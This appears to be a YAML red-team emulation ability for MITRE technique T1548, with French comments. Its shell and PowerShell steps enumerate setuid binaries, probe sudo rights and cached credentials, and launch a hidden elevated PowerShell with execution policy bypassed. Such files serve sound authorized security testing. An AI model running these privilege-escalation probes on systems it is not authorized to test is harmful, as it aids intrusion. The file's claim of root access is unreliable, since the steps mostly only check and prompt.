id: 6789abcd-1234-5678-90ab-cdef12345678
name: Privilege Escalation via Setuid, Setgid, and Sudo Abuse
description: Exploit setuid, setgid, and misconfigured sudo permissions to escalate privileges on a compromised system.
tactic: privilege-escalation
technique:
  attack_id: T1548
  name: Abuse Elevation Control Mechanism
  reference: https://attack.mitre.org/techniques/T1548/
platforms:
  linux:
    executor:
      name: sh
      command: |
        # 1️⃣ Exploitation d'un fichier avec le bit setuid
        echo "[*] Exploitation de setuid et setgid"
        find / -perm -u=s -type f 2>/dev/null
        if [ -x "/usr/bin/passwd" ]; then
          /usr/bin/passwd
        fi

        # 2️⃣ Escalade de privilèges via sudo mal configuré
        echo "[*] Tentative d'abus de Sudo"
        sudo -l
        if sudo -n true 2>/dev/null; then
          sudo bash -c "echo 'Accès root réussi via sudo cache'"
        else
          echo "Pas d'accès sudo sans mot de passe"
        fi
    cleanup: |
      # Aucune action de nettoyage nécessaire ici car il n'y a pas de fichiers persistants créés.
      echo "Aucune action de nettoyage nécessaire."
  macos:
    executor:
      name: sh
      command: |
        # 1️⃣ Exploitation des fichiers avec le bit setuid
        echo "[*] Recherche de fichiers avec le bit setuid activé"
        find / -perm -u=s -type f 2>/dev/null
        if [ -x "/usr/bin/passwd" ]; then
          /usr/bin/passwd
        fi

        # 2️⃣ Abus de Sudo et mise en cache
        echo "[*] Tentative d'abus de sudo"
        sudo -l
        if sudo -n true 2>/dev/null; then
          sudo bash -c "echo 'Accès root réussi via sudo cache'"
        else
          echo "Pas d'accès sudo sans mot de passe"
        fi
    cleanup: |
      # Aucune action de nettoyage nécessaire
      echo "Aucune action de nettoyage nécessaire."
  windows:
    executor:
      name: powershell
      command: |
        # Escalade de privilèges via le contrôle des comptes d'utilisateur (UAC)
        echo "[*] Tentative d'abus d'UAC"
        Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"Start-Process powershell -Verb RunAs`"" -WindowStyle Hidden
    cleanup: |
      # Nettoyage des traces d'escalade de privilèges
      echo "Aucune action de nettoyage nécessaire."

# Les conditions de succès de l'attaque
requirements:
  - name: sudo
    type: binary
  - name: find
    type: binary
  - name: passwd
    type: binary
  - name: powershell
    type: binary

# Indicateurs de succès
privilege:
  escalation: true
  root_access: true

# Métadonnées
metadata:
  author: Cybersecurity Analyst
  creation_date: 2024-12-10
  mitre_techniques:
    - T1548
    - T1548.001
    - T1548.003
  tags:
    - privilege-escalation
    - setuid
    - setgid
    - sudo-abuse
    - misconfigured-sudo